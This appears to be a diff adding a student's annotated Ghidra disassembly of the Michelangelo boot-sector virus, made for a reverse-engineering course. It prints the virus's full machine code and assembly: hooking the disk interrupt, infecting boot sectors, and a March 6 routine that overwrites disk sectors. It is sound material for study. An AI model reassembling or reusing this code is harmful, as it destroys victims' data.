@@ -1,0 +1,332 @@
+<html><BODY BGCOLOR=#ffffe0><FONT FACE=COURIER SIZE=3><STRONG><PRE>
+<A NAME="0000:7c00"></A>                            ;************************************************************************************************
+                            ;*  File: michaelangelo.1 (for assignment 2&3 in GLND's RE)                                     *
+                            ;*  By: Zachary Robert James (zjames8@lsu.edu; zach15james@proton.me)                           *
+                            ;*  Tool: Ghidra ... bc:                                                                        *
+                            ;*  (in FL with family, and Cisco VPN --> QNAP server --> VMware on my local laptop lacked permis...*
+                            ;*  ie (i) rebasing, (ii) commenting, that it would be okay...)                                 *
+                            ;************************************************************************************************
+                            LAB_0000_7c00:                ;XREF[2,1]:   <A HREF="#0000:7cee">0000:7cee(R)</A>,<A HREF="#0000:7cee">0000:7cee(R)</A>,<A HREF="#0000:7cee">0000:7cee(R)</A>
+ram:0000:7c00   e9ac00          JMP         <A HREF="#0000:7caf">FUN_0000_7caf</A>                           ;undefined FUN_0000_7caf()
+                            ;first jump to the entry pt of virus 
+<A NAME="0000:7c03"></A>                            DAT_0000_7c03:                ;XREF[1]:     <A HREF="#0000:7cf0">0000:7cf0(R)</A>
+ram:0000:7c03   f500            undefined2  00F5h                                   ;High_Entry ie the offset to jump to ...
+<A NAME="0000:7c05"></A>                            DAT_0000_7c05:                ;XREF[1]:     <A HREF="#0000:7cd8">0000:7cd8(W)</A>
+ram:0000:7c05   0000            undefined2  0000h                                   ;High_Entry_Seg value (:= 0) for cont...
+<A NAME="0000:7c07"></A>ram:0000:7c07   02              ??          02h                                     ;Disk_Heads (:= 2), destroying 2 at a...
+<A NAME="0000:7c08"></A>ram:0000:7c08   0e              ??          0Eh                                     ;Orig_BootS ~ sector # where original...
+<A NAME="0000:7c09"></A>ram:0000:7c09   00              ??          00h                                     
+<A NAME="0000:7c0a"></A>                            DAT_0000_7c0a:                ;XREF[1]:     <A HREF="#0000:7cc1">0000:7cc1(W)</A>
+ram:0000:7c0a   3997            undefined2  9739h                                   ;Int_13 offset where the MSDOS Disk I...
+<A NAME="0000:7c0c"></A>                            DAT_0000_7c0c:                ;XREF[1]:     <A HREF="#0000:7cc7">0000:7cc7(W)</A>
+ram:0000:7c0c   00f0            undefined2  F000h                                   ;Int_13_Seg of the original int13 han...
+<A NAME="0000:7c0e"></A>                            ;Evil_Int_13
+ram:0000:7c0e   1e              PUSH        DS                                      ;push 0 (defaulted)
+<A NAME="0000:7c0f"></A>ram:0000:7c0f   50              PUSH        AX                                      ;push 7C00 (base to use for offsettin...
+<A NAME="0000:7c10"></A>ram:0000:7c10   0ad2            OR          DL,DL                                   ;check drive A... drive letter (dl is...
+<A NAME="0000:7c12"></A>ram:0000:7c12   751b            JNZ         <A HREF="#0000:7c2f">LAB_0000_7c2f</A>                           ;if drive A unavailable (ZF != 0), ju...
+<A NAME="0000:7c14"></A>ram:0000:7c14   33c0            XOR         AX,AX                                   ;wipe ax := 0 (on disk A) if jnz skipped
+<A NAME="0000:7c16"></A>ram:0000:7c16   8ed8            MOV         DS,AX                                   ;ie set ds := ax = 0
+<A NAME="0000:7c18"></A>ram:0000:7c18   f6063f0401      TEST        byte ptr [0x43f],0x1                    ;is the first bit (0-bit) set ie flop...
+<A NAME="0000:7c1d"></A>ram:0000:7c1d   7510            JNZ         <A HREF="#0000:7c2f">LAB_0000_7c2f</A>                           ;if not ZF != 1 ie ZF = 0, then disk ...
+<A NAME="0000:7c1f"></A>ram:0000:7c1f   58              POP         AX                                      ;restore
+<A NAME="0000:7c20"></A>ram:0000:7c20   1f              POP         DS                                      
+<A NAME="0000:7c21"></A>ram:0000:7c21   9c              PUSHF                                               ;save state before calling the real I...
+<A NAME="0000:7c22"></A>ram:0000:7c22   2eff1e0a00      CALLF       [0xa]                                   
+<A NAME="0000:7c27"></A>ram:0000:7c27   9c              PUSHF                                               ;save flags to reset after malware call
+<A NAME="0000:7c28"></A>ram:0000:7c28   e80b00          CALL        <A HREF="#0000:7c36">FUN_0000_7c36</A>                           ;floppy malware call
+<A NAME="0000:7c2b"></A>ram:0000:7c2b   9d              POPF                                                ;restore registers as they were before
+<A NAME="0000:7c2c"></A>ram:0000:7c2c   ca0200          RETF        0x2                                     ;OHH... when this retuns, its discard...
+<A NAME="0000:7c2f"></A>                            LAB_0000_7c2f:                ;XREF[2]:     <A HREF="#0000:7c12">0000:7c12(j)</A>,<A HREF="#0000:7c1d">0000:7c1d(j)</A>
+ram:0000:7c2f   58              POP         AX                                      ;END ROUTINE... NO, rather: convolude...
+<A NAME="0000:7c30"></A>ram:0000:7c30   1f              POP         DS                                      
+<A NAME="0000:7c31"></A>ram:0000:7c31   2eff2e0a00      JMPF        CS:[DAT_0000_000a]                      
+<A NAME="0000:7c36"></A>                            ;************************************************************************************************
+                            ;*                                           FUNCTION                                           *
+                            ;************************************************************************************************
+                            ;undefined FUN_0000_7c36()
+                            ;INFECTION ROUTINE.... first called... and then inside you first save all these registers ie the register states... that is a sign (gleaned from xorpd puzzles) ie if you save the exact state or do things to reset the state as it was before, you are likely trying to hid / cover whats in the middle
+                                                          ;XREF[1]:     <A HREF="#0000:7c28">0000:7c28(c)</A>
+ram:0000:7c36   50              PUSH        AX                                      
+<A NAME="0000:7c37"></A>ram:0000:7c37   53              PUSH        BX                                      
+<A NAME="0000:7c38"></A>ram:0000:7c38   51              PUSH        CX                                      
+<A NAME="0000:7c39"></A>ram:0000:7c39   52              PUSH        DX                                      
+<A NAME="0000:7c3a"></A>ram:0000:7c3a   1e              PUSH        DS                                      
+<A NAME="0000:7c3b"></A>ram:0000:7c3b   06              PUSH        ES                                      
+<A NAME="0000:7c3c"></A>ram:0000:7c3c   56              PUSH        SI                                      
+<A NAME="0000:7c3d"></A>ram:0000:7c3d   57              PUSH        DI                                      
+<A NAME="0000:7c3e"></A>ram:0000:7c3e   0e              PUSH        CS                                      ;CS --> DS ie DS:=CS
+<A NAME="0000:7c3f"></A>ram:0000:7c3f   1f              POP         DS                                      
+<A NAME="0000:7c40"></A>ram:0000:7c40   0e              PUSH        CS                                      
+<A NAME="0000:7c41"></A>ram:0000:7c41   07              POP         ES                                      ;ES:=CS
+<A NAME="0000:7c42"></A>ram:0000:7c42   be0400          MOV         SI,0x4                                  ;si:=4 (for later read ops)
+<A NAME="0000:7c45"></A>                            LAB_0000_7c45:                ;XREF[1]:     <A HREF="#0000:7c5f">0000:7c5f(j)</A>
+ram:0000:7c45   b80102          MOV         AX,0x201                                ;AX := [AH = 02h ~ read sectors fn][A...
+<A NAME="0000:7c48"></A>ram:0000:7c48   bb0002          MOV         BX,0x200                                
+<A NAME="0000:7c4b"></A>ram:0000:7c4b   b90100          MOV         CX,0x1                                  ;cx:= 1
+<A NAME="0000:7c4e"></A>ram:0000:7c4e   33d2            XOR         DX,DX                                   ;dl = 0 ==> drive letter 0 ie drive A...
+<A NAME="0000:7c50"></A>ram:0000:7c50   9c              PUSHF                                               ;save the current flags by pushing th...
+<A NAME="0000:7c51"></A>ram:0000:7c51   ff1e0a00        CALLF       [0xa]                                   ;call real Int_13 handler ie [0xa]
+<A NAME="0000:7c55"></A>ram:0000:7c55   730c            JNC         <A HREF="#0000:7c63">LAB_0000_7c63</A>                           ;note: GLDN's ida pro disassebmly had...
+<A NAME="0000:7c57"></A>ram:0000:7c57   33c0            XOR         AX,AX                                   ;0s out ax
+<A NAME="0000:7c59"></A>ram:0000:7c59   9c              PUSHF                                               ;save flags... for when you need to d...
+<A NAME="0000:7c5a"></A>ram:0000:7c5a   ff1e0a00        CALLF       [0xa]                                   ;real Int_13 handler
+<A NAME="0000:7c5e"></A>ram:0000:7c5e   4e              DEC         SI                                      ;retry_count--... proverbially
+<A NAME="0000:7c5f"></A>ram:0000:7c5f   75e4            JNZ         <A HREF="#0000:7c45">LAB_0000_7c45</A>                           ;call itself (ie keep doing the loop ...
+<A NAME="0000:7c61"></A>ram:0000:7c61   eb43            JMP         <A HREF="#0000:7ca6">LAB_0000_7ca6</A>                           ;done trying to infect ==> OMEGA!
+<A NAME="0000:7c63"></A>                            ;flop infected???
+                            LAB_0000_7c63:                ;XREF[1]:     <A HREF="#0000:7c55">0000:7c55(j)</A>
+ram:0000:7c63   33f6            XOR         SI,SI                                   ;to read 1st work of virus, the src i...
+<A NAME="0000:7c65"></A>ram:0000:7c65   fc              CLD                                                 ;makes string options increment si, di
+<A NAME="0000:7c66"></A>ram:0000:7c66   ad              LODSW       SI                                      ;load 1st word of virus ds:si --> ax
+<A NAME="0000:7c67"></A>                            ;************************************************************************************************
+                            ;*       if both compares hold true then roughtly, it is likely it already has the virus        *
+                            ;************************************************************************************************
+ram:0000:7c67   3b07            CMP         AX,word ptr [BX]                        
+<A NAME="0000:7c69"></A>ram:0000:7c69   7506            JNZ         <A HREF="#0000:7c71">LAB_0000_7c71</A>                           
+<A NAME="0000:7c6b"></A>ram:0000:7c6b   ad              LODSW       SI                                      ;load 2nd word of vius into ds:si
+<A NAME="0000:7c6c"></A>ram:0000:7c6c   3b4702          CMP         AX,word ptr [BX + 0x2]                  
+<A NAME="0000:7c6f"></A>ram:0000:7c6f   7435            JZ          <A HREF="#0000:7ca6">LAB_0000_7ca6</A>                           ;==> OMEGA (if 2 checks are the same,...
+<A NAME="0000:7c71"></A>                            LAB_0000_7c71:                ;XREF[1]:     <A HREF="#0000:7c69">0000:7c69(j)</A>
+ram:0000:7c71   b80103          MOV         AX,0x301                                ;back up location check for hiding th...
+<A NAME="0000:7c74"></A>ram:0000:7c74   b601            MOV         DH,0x1                                  ;head # 1
+<A NAME="0000:7c76"></A>ram:0000:7c76   b103            MOV         CL,0x3                                  ;sector # 3 (implied, unamed, track 0)
+<A NAME="0000:7c78"></A>ram:0000:7c78   807f15fd        CMP         byte ptr [BX + 0x15],0xfd               ;checking media sector byte (in DOS o...
+<A NAME="0000:7c7c"></A>ram:0000:7c7c   7402            JZ          <A HREF="#0000:7c80">LAB_0000_7c80</A>                           ;if they are the same, then the backu...
+<A NAME="0000:7c7e"></A>ram:0000:7c7e   b10e            MOV         CL,0xe                                  ;else, try / go-to teh 14th sector fo...
+<A NAME="0000:7c80"></A>                            LAB_0000_7c80:                ;XREF[1]:     <A HREF="#0000:7c7c">0000:7c7c(j)</A>
+ram:0000:7c80   890e0800        MOV         word ptr [0x8],CX                       ;cache backup bootsector location
+<A NAME="0000:7c84"></A>ram:0000:7c84   9c              PUSHF                                               ;save flags
+<A NAME="0000:7c85"></A>ram:0000:7c85   ff1e0a00        CALLF       [0xa]                                   ;use real int to write backup bootsector
+<A NAME="0000:7c89"></A>ram:0000:7c89   721b            JC          <A HREF="#0000:7ca6">LAB_0000_7ca6</A>                           ;if it carried (ie failed the callf) ...
+<A NAME="0000:7c8b"></A>                            ;source and dest of copy
+ram:0000:7c8b   bebe03          MOV         SI,0x3be                                
+<A NAME="0000:7c8e"></A>ram:0000:7c8e   bfbe01          MOV         DI,0x1be                                
+<A NAME="0000:7c91"></A>ram:0000:7c91   b92100          MOV         CX,0x21                                 
+<A NAME="0000:7c94"></A>ram:0000:7c94   fc              CLD                                                 
+<A NAME="0000:7c95"></A>ram:0000:7c95   f3a5            MOVSW.REP   ES:DI,SI                                ;repeat cx = 0x21h times (the for loo...
+<A NAME="0000:7c97"></A>ram:0000:7c97   b80103          MOV         AX,0x301                                
+<A NAME="0000:7c9a"></A>ram:0000:7c9a   33db            XOR         BX,BX                                   ;es:bx is start of buffier ==> start ...
+<A NAME="0000:7c9c"></A>ram:0000:7c9c   b90100          MOV         CX,0x1                                  
+<A NAME="0000:7c9f"></A>ram:0000:7c9f   33d2            XOR         DX,DX                                   
+<A NAME="0000:7ca1"></A>ram:0000:7ca1   9c              PUSHF                                               ;saves flags
+<A NAME="0000:7ca2"></A>ram:0000:7ca2   ff1e0a00        CALLF       [0xa]                                   
+<A NAME="0000:7ca6"></A>                            LAB_0000_7ca6:                ;XREF[3]:     <A HREF="#0000:7c61">0000:7c61(j)</A>,<A HREF="#0000:7c6f">0000:7c6f(j)</A>,<A HREF="#0000:7c89">0000:7c89(j)</A>
+ram:0000:7ca6   5f              POP         DI                                      ;"OMEGA" function resets the register...
+<A NAME="0000:7ca7"></A>ram:0000:7ca7   5e              POP         SI                                      
+<A NAME="0000:7ca8"></A>ram:0000:7ca8   07              POP         ES                                      
+<A NAME="0000:7ca9"></A>ram:0000:7ca9   1f              POP         DS                                      
+<A NAME="0000:7caa"></A>ram:0000:7caa   5a              POP         DX                                      
+<A NAME="0000:7cab"></A>ram:0000:7cab   59              POP         CX                                      
+<A NAME="0000:7cac"></A>ram:0000:7cac   5b              POP         BX                                      
+<A NAME="0000:7cad"></A>ram:0000:7cad   58              POP         AX                                      
+<A NAME="0000:7cae"></A>ram:0000:7cae   c3              RET                                                 
+<A NAME="0000:7caf"></A>                            ;************************************************************************************************
+                            ;*                                           FUNCTION                                           *
+                            ;************************************************************************************************
+                            ;undefined FUN_0000_7caf()
+                                                          ;XREF[1]:     <A HREF="#0000:7c00">0000:7c00(c)</A>
+ram:0000:7caf   33c0            XOR         AX,AX                                   ;zeroing these out: ax,ds,ss
+<A NAME="0000:7cb1"></A>ram:0000:7cb1   8ed8            MOV         DS,AX                                   
+<A NAME="0000:7cb3"></A>ram:0000:7cb3   fa              CLI                                                 ;disable interrupts for now
+<A NAME="0000:7cb4"></A>ram:0000:7cb4   8ed0            MOV         SS,AX                                   
+<A NAME="0000:7cb6"></A>ram:0000:7cb6   b8007c          MOV         AX,0x7c00                               
+<A NAME="0000:7cb9"></A>ram:0000:7cb9   8be0            MOV         SP,AX                                   ;load address is set to beginnning of...
+<A NAME="0000:7cbb"></A>ram:0000:7cbb   fb              STI                                                 ;restore interrupts
+<A NAME="0000:7cbc"></A>ram:0000:7cbc   1e              PUSH        DS                                      ;save ds and ax states for later
+<A NAME="0000:7cbd"></A>ram:0000:7cbd   50              PUSH        AX                                      
+<A NAME="0000:7cbe"></A>ram:0000:7cbe   a14c00          MOV         AX,[0x4c]                               ;13h * 4 ~ offset of int13h hander ad...
+<A NAME="0000:7cc1"></A>ram:0000:7cc1   a30a7c          MOV         <A HREF="#0000:7c0a">[DAT_0000_7c0a]</A>,AX                      ;MODIFYING / RESETTING INT13h offset ...
+<A NAME="0000:7cc4"></A>ram:0000:7cc4   a14e00          MOV         AX,[0x4e]                               
+<A NAME="0000:7cc7"></A>ram:0000:7cc7   a30c7c          MOV         <A HREF="#0000:7c0c">[DAT_0000_7c0c]</A>,AX                      ;= F000h
+<A NAME="0000:7cca"></A>ram:0000:7cca   a11304          MOV         AX,[0x413]                              
+<A NAME="0000:7ccd"></A>ram:0000:7ccd   48              DEC         AX                                      ;reduce memory size
+<A NAME="0000:7cce"></A>ram:0000:7cce   48              DEC         AX                                      
+<A NAME="0000:7ccf"></A>ram:0000:7ccf   a31304          MOV         [0x413],AX                              ;store that memory size - its stolen ...
+<A NAME="0000:7cd2"></A>ram:0000:7cd2   b106            MOV         CL,0x6                                  
+<A NAME="0000:7cd4"></A>ram:0000:7cd4   d3e0            SHL         AX,CL                                   ;gives the segment value as seg = ax ...
+<A NAME="0000:7cd6"></A>ram:0000:7cd6   8ec0            MOV         ES,AX                                   
+<A NAME="0000:7cd8"></A>ram:0000:7cd8   a3057c          MOV         <A HREF="#0000:7c05">[DAT_0000_7c05]</A>,AX                      ;new block is saved to Highentry seg ...
+<A NAME="0000:7cdb"></A>ram:0000:7cdb   b80e00          MOV         AX,0xe                                  
+<A NAME="0000:7cde"></A>ram:0000:7cde   a34c00          MOV         [0x4c],AX                               
+<A NAME="0000:7ce1"></A>ram:0000:7ce1   8c064e00        MOV         word ptr [0x4e],ES                      
+<A NAME="0000:7ce5"></A>ram:0000:7ce5   b9be01          MOV         CX,0x1be                                ;copying virus code 
+<A NAME="0000:7ce8"></A>ram:0000:7ce8   be007c          MOV         SI,0x7c00                               
+<A NAME="0000:7ceb"></A>ram:0000:7ceb   33ff            XOR         DI,DI                                   ;wiping di
+<A NAME="0000:7ced"></A>ram:0000:7ced   fc              CLD                                                 
+<A NAME="0000:7cee"></A>                                                          ; FWD[2]:     <A HREF="#0000:7c00">0000:7c00(R)</A>,<A HREF="#0000:7c01">0000:7c01(R)</A>
+ram:0000:7cee   f3a4            MOVSB.REP   ES:DI,<A HREF="#0000:7c00">SI=>LAB_0000_7c00</A>                 ;copy normal int13 address for later ...
+<A NAME="0000:7cf0"></A>ram:0000:7cf0   2eff2e037c      JMPF        <A HREF="#0000:7c03">CS:[DAT_0000_7c03]</A>                      ;jump ~ "jump far" ~ unconditional, i...
+<A NAME="0000:7cf5"></A>ram:0000:7cf5   33c0            XOR         AX,AX                                   
+<A NAME="0000:7cf7"></A>ram:0000:7cf7   8ec0            MOV         ES,AX                                   ;es := ax == 0
+<A NAME="0000:7cf9"></A>ram:0000:7cf9   cd13            INT         0x13                                    ;do the disk call... reset disk syste...
+<A NAME="0000:7cfb"></A>ram:0000:7cfb   0e              PUSH        CS                                      ;ds := cs == evil int13 ? 
+<A NAME="0000:7cfc"></A>ram:0000:7cfc   1f              POP         DS                                      
+<A NAME="0000:7cfd"></A>ram:0000:7cfd   b80102          MOV         AX,0x201                                ;says we will read one sector
+<A NAME="0000:7d00"></A>ram:0000:7d00   bb007c          MOV         BX,0x7c00                               ;we will read it into the memoy of th...
+<A NAME="0000:7d03"></A>ram:0000:7d03   8b0e0800        MOV         CX,word ptr [0x8]                       ;get the backup boot sector loction (...
+<A NAME="0000:7d07"></A>ram:0000:7d07   83f907          CMP         CX,0x7                                  ;is it a HD???
+<A NAME="0000:7d0a"></A>ram:0000:7d0a   7507            JNZ         <A HREF="#0000:7d13">LAB_0000_7d13</A>                           ;no ==> floppy so run that code
+<A NAME="0000:7d0c"></A>ram:0000:7d0c   ba8000          MOV         DX,0x80                                 ;choose sector from first HD ==> read...
+<A NAME="0000:7d0f"></A>ram:0000:7d0f   cd13            INT         0x13                                    
+<A NAME="0000:7d11"></A>ram:0000:7d11   eb2b            JMP         <A HREF="#0000:7d3e">LAB_0000_7d3e</A>                           
+<A NAME="0000:7d13"></A>                            ;floppy code
+                            LAB_0000_7d13:                ;XREF[1]:     <A HREF="#0000:7d0a">0000:7d0a(j)</A>
+ram:0000:7d13   8b0e0800        MOV         CX,word ptr [0x8]                       ;grabbing backup boot sector saved here
+<A NAME="0000:7d17"></A>ram:0000:7d17   ba0001          MOV         DX,0x100                                ;==> drive letter A and dh (disk head) 1
+<A NAME="0000:7d1a"></A>ram:0000:7d1a   cd13            INT         0x13                                    
+<A NAME="0000:7d1c"></A>ram:0000:7d1c   7220            JC          <A HREF="#0000:7d3e">LAB_0000_7d3e</A>                           ;if there is an error w/ this write /...
+<A NAME="0000:7d1e"></A>ram:0000:7d1e   0e              PUSH        CS                                      
+<A NAME="0000:7d1f"></A>ram:0000:7d1f   07              POP         ES                                      ;es := cs
+<A NAME="0000:7d20"></A>ram:0000:7d20   b80102          MOV         AX,0x201                                ;reading 1 sector..
+<A NAME="0000:7d23"></A>ram:0000:7d23   bb0002          MOV         BX,0x200                                ;512 bytes beyond virus code
+<A NAME="0000:7d26"></A>ram:0000:7d26   b90100          MOV         CX,0x1                                  ;sector 1 (& track 0)
+<A NAME="0000:7d29"></A>ram:0000:7d29   ba8000          MOV         DX,0x80                                 ;set to read from HDD 1
+<A NAME="0000:7d2c"></A>ram:0000:7d2c   cd13            INT         0x13                                    ;read in sectors... if error, go chec...
+<A NAME="0000:7d2e"></A>ram:0000:7d2e   720e            JC          <A HREF="#0000:7d3e">LAB_0000_7d3e</A>                           
+<A NAME="0000:7d30"></A>ram:0000:7d30   33f6            XOR         SI,SI                                   ;source = 0 offset
+<A NAME="0000:7d32"></A>ram:0000:7d32   fc              CLD                                                 ;string ops increment si&di
+<A NAME="0000:7d33"></A>ram:0000:7d33   ad              LODSW       SI                                      ;load the string --> SI
+<A NAME="0000:7d34"></A>ram:0000:7d34   3b07            CMP         AX,word ptr [BX]                        ;does a word of this virus match a wo...
+<A NAME="0000:7d36"></A>ram:0000:7d36   754f            JNZ         <A HREF="#0000:7d87">LAB_0000_7d87</A>                           ;no ==> then go do the HDD code check...
+<A NAME="0000:7d38"></A>ram:0000:7d38   ad              LODSW       SI                                      ;check 2nd word of the virus
+<A NAME="0000:7d39"></A>ram:0000:7d39   3b4702          CMP         AX,word ptr [BX + 0x2]                  
+<A NAME="0000:7d3c"></A>ram:0000:7d3c   7549            JNZ         <A HREF="#0000:7d87">LAB_0000_7d87</A>                           ;doesn't match, then go to hdd infect...
+<A NAME="0000:7d3e"></A>                            ;now virus code is read in... 
+                            LAB_0000_7d3e:                ;XREF[5]:     <A HREF="#0000:7d11">0000:7d11(j)</A>,<A HREF="#0000:7d1c">0000:7d1c(j)</A>,<A HREF="#0000:7d2e">0000:7d2e(j)</A>,<A HREF="#0000:7d96">0000:7d96(j)</A>,
+                                                          ;             <A HREF="#0000:7dac">0000:7dac(j)</A>
+ram:0000:7d3e   33c9            XOR         CX,CX                                   ;so we can check the date, and either...
+<A NAME="0000:7d40"></A>ram:0000:7d40   b404            MOV         AH,0x4                                  ;fn code #4 ==> check date
+<A NAME="0000:7d42"></A>ram:0000:7d42   cd1a            INT         0x1a                                    ;runs code & chacks date --saving to-...
+<A NAME="0000:7d44"></A>ram:0000:7d44   81fa0603        CMP         DX,0x306                                ;is it 3/6 ie March 6???
+<A NAME="0000:7d48"></A>ram:0000:7d48   7401            JZ          <A HREF="#0000:7d4b">LAB_0000_7d4b</A>                           ;it is!!
+<A NAME="0000:7d4a"></A>ram:0000:7d4a   cb              RETF                                                ;no... then retuns to real int 13 seg...
+<A NAME="0000:7d4b"></A>                            LAB_0000_7d4b:                ;XREF[1]:     <A HREF="#0000:7d48">0000:7d48(j)</A>
+ram:0000:7d4b   33d2            XOR         DX,DX                                   ;head and drive 0
+<A NAME="0000:7d4d"></A>ram:0000:7d4d   b90100          MOV         CX,0x1                                  ;track 0, sector 1
+<A NAME="0000:7d50"></A>                            LAB_0000_7d50:                ;XREF[2]:     <A HREF="#0000:7d7f">0000:7d7f(j)</A>,<A HREF="#0000:7d85">0000:7d85(j)</A>
+ram:0000:7d50   b80903          MOV         AX,0x309                                ;write 9 sectors... why the 300 + ??
+<A NAME="0000:7d53"></A>ram:0000:7d53   8b360800        MOV         SI,word ptr [0x8]                       ;grabbing backup boot sector
+<A NAME="0000:7d57"></A>ram:0000:7d57   83fe03          CMP         SI,0x3                                  ;is this a 360k floppy disk? ... will...
+<A NAME="0000:7d5a"></A>ram:0000:7d5a   7410            JZ          <A HREF="#0000:7d6c">LAB_0000_7d6c</A>                           ;is a 360k floppy... then proceed w/ ...
+<A NAME="0000:7d5c"></A>ram:0000:7d5c   b00e            MOV         AL,0xe                                  ;non-360k floppy?
+<A NAME="0000:7d5e"></A>ram:0000:7d5e   83fe0e          CMP         SI,0xe                                  
+<A NAME="0000:7d61"></A>ram:0000:7d61   7409            JZ          <A HREF="#0000:7d6c">LAB_0000_7d6c</A>                           ;continue deleting if its a floppy
+<A NAME="0000:7d63"></A>ram:0000:7d63   b280            MOV         DL,0x80                                 ;its a HD ==> max disk heads = 4 for ...
+<A NAME="0000:7d65"></A>ram:0000:7d65   c606070004      MOV         byte ptr [0x7],0x4                      
+<A NAME="0000:7d6a"></A>ram:0000:7d6a   b011            MOV         AL,0x11                                 
+<A NAME="0000:7d6c"></A>                            ;...continuing the deletion...
+                            LAB_0000_7d6c:                ;XREF[2]:     <A HREF="#0000:7d5a">0000:7d5a(j)</A>,<A HREF="#0000:7d61">0000:7d61(j)</A>
+ram:0000:7d6c   bb0050          MOV         BX,0x5000                               ;find buffer seg & offset at 5000h......
+<A NAME="0000:7d6f"></A>ram:0000:7d6f   8ec3            MOV         ES,BX                                   
+<A NAME="0000:7d71"></A>ram:0000:7d71   cd13            INT         0x13                                    ;write sectors of disk
+<A NAME="0000:7d73"></A>ram:0000:7d73   7304            JNC         <A HREF="#0000:7d79">LAB_0000_7d79</A>                           ;continue to below OR if error, the n...
+<A NAME="0000:7d75"></A>ram:0000:7d75   32e4            XOR         AH,AH                                   
+<A NAME="0000:7d77"></A>ram:0000:7d77   cd13            INT         0x13                                    
+<A NAME="0000:7d79"></A>                            LAB_0000_7d79:                ;XREF[1]:     <A HREF="#0000:7d73">0000:7d73(j)</A>
+ram:0000:7d79   fec6            INC         DH                                      ;check next disk head... and is it < ...
+<A NAME="0000:7d7b"></A>ram:0000:7d7b   3a360700        CMP         DH,byte ptr [0x7]                       
+<A NAME="0000:7d7f"></A>ram:0000:7d7f   72cf            JC          <A HREF="#0000:7d50">LAB_0000_7d50</A>                           ;if head < max_heads ie there are mor...
+<A NAME="0000:7d81"></A>ram:0000:7d81   32f6            XOR         DH,DH                                   ;reset head counter, increment track....
+<A NAME="0000:7d83"></A>ram:0000:7d83   fec5            INC         CH                                      
+<A NAME="0000:7d85"></A>ram:0000:7d85   ebc9            JMP         <A HREF="#0000:7d50">LAB_0000_7d50</A>                           ;then run through this delete loop on...
+<A NAME="0000:7d87"></A>                            ;HDD special code
+                            LAB_0000_7d87:                ;XREF[2]:     <A HREF="#0000:7d36">0000:7d36(j)</A>,<A HREF="#0000:7d3c">0000:7d3c(j)</A>
+ram:0000:7d87   b90700          MOV         CX,0x7                                  
+<A NAME="0000:7d8a"></A>ram:0000:7d8a   890e0800        MOV         word ptr [0x8],CX                       
+<A NAME="0000:7d8e"></A>ram:0000:7d8e   b80103          MOV         AX,0x301                                ;writing eins sector
+<A NAME="0000:7d91"></A>ram:0000:7d91   ba8000          MOV         DX,0x80                                 ;first HDD
+<A NAME="0000:7d94"></A>ram:0000:7d94   cd13            INT         0x13                                    ;writing sectors
+<A NAME="0000:7d96"></A>ram:0000:7d96   72a6            JC          <A HREF="#0000:7d3e">LAB_0000_7d3e</A>                           ;go and check the date
+<A NAME="0000:7d98"></A>ram:0000:7d98   bebe03          MOV         SI,0x3be                                ;write the virus down for later...
+<A NAME="0000:7d9b"></A>ram:0000:7d9b   bfbe01          MOV         DI,0x1be                                ;copies the virus to a valid boot par...
+<A NAME="0000:7d9e"></A>ram:0000:7d9e   b92100          MOV         CX,0x21                                 
+<A NAME="0000:7da1"></A>ram:0000:7da1   f3a5            MOVSW.REP   ES:DI,SI                                
+<A NAME="0000:7da3"></A>ram:0000:7da3   b80103          MOV         AX,0x301                                
+<A NAME="0000:7da6"></A>ram:0000:7da6   33db            XOR         BX,BX                                   
+<A NAME="0000:7da8"></A>ram:0000:7da8   fec1            INC         CL                                      
+<A NAME="0000:7daa"></A>ram:0000:7daa   cd13            INT         0x13                                    
+<A NAME="0000:7dac"></A>ram:0000:7dac   eb90            JMP         <A HREF="#0000:7d3e">LAB_0000_7d3e</A>                           ;jumpt to the date check once the HDD...
+<A NAME="0000:7dae"></A>ram:0000:7dae   00              ??          00h                                     
+<A NAME="0000:7daf"></A>ram:0000:7daf   00              ??          00h                                     
+<A NAME="0000:7db0"></A>ram:0000:7db0   00              ??          00h                                     
+<A NAME="0000:7db1"></A>ram:0000:7db1   00              ??          00h                                     
+<A NAME="0000:7db2"></A>ram:0000:7db2   00              ??          00h                                     
+<A NAME="0000:7db3"></A>ram:0000:7db3   00              ??          00h                                     
+<A NAME="0000:7db4"></A>ram:0000:7db4   00              ??          00h                                     
+<A NAME="0000:7db5"></A>ram:0000:7db5   00              ??          00h                                     
+<A NAME="0000:7db6"></A>ram:0000:7db6   00              ??          00h                                     
+<A NAME="0000:7db7"></A>ram:0000:7db7   00              ??          00h                                     
+<A NAME="0000:7db8"></A>ram:0000:7db8   00              ??          00h                                     
+<A NAME="0000:7db9"></A>ram:0000:7db9   00              ??          00h                                     
+<A NAME="0000:7dba"></A>ram:0000:7dba   00              ??          00h                                     
+<A NAME="0000:7dbb"></A>ram:0000:7dbb   00              ??          00h                                     
+<A NAME="0000:7dbc"></A>ram:0000:7dbc   00              ??          00h                                     
+<A NAME="0000:7dbd"></A>ram:0000:7dbd   00              ??          00h                                     
+<A NAME="0000:7dbe"></A>ram:0000:7dbe   00              ??          00h                                     
+<A NAME="0000:7dbf"></A>ram:0000:7dbf   00              ??          00h                                     
+<A NAME="0000:7dc0"></A>ram:0000:7dc0   00              ??          00h                                     
+<A NAME="0000:7dc1"></A>ram:0000:7dc1   00              ??          00h                                     
+<A NAME="0000:7dc2"></A>ram:0000:7dc2   00              ??          00h                                     
+<A NAME="0000:7dc3"></A>ram:0000:7dc3   00              ??          00h                                     
+<A NAME="0000:7dc4"></A>ram:0000:7dc4   00              ??          00h                                     
+<A NAME="0000:7dc5"></A>ram:0000:7dc5   00              ??          00h                                     
+<A NAME="0000:7dc6"></A>ram:0000:7dc6   00              ??          00h                                     
+<A NAME="0000:7dc7"></A>ram:0000:7dc7   00              ??          00h                                     
+<A NAME="0000:7dc8"></A>ram:0000:7dc8   00              ??          00h                                     
+<A NAME="0000:7dc9"></A>ram:0000:7dc9   00              ??          00h                                     
+<A NAME="0000:7dca"></A>ram:0000:7dca   00              ??          00h                                     
+<A NAME="0000:7dcb"></A>ram:0000:7dcb   00              ??          00h                                     
+<A NAME="0000:7dcc"></A>ram:0000:7dcc   00              ??          00h                                     
+<A NAME="0000:7dcd"></A>ram:0000:7dcd   00              ??          00h                                     
+<A NAME="0000:7dce"></A>ram:0000:7dce   00              ??          00h                                     
+<A NAME="0000:7dcf"></A>ram:0000:7dcf   00              ??          00h                                     
+<A NAME="0000:7dd0"></A>ram:0000:7dd0   00              ??          00h                                     
+<A NAME="0000:7dd1"></A>ram:0000:7dd1   00              ??          00h                                     
+<A NAME="0000:7dd2"></A>ram:0000:7dd2   00              ??          00h                                     
+<A NAME="0000:7dd3"></A>ram:0000:7dd3   00              ??          00h                                     
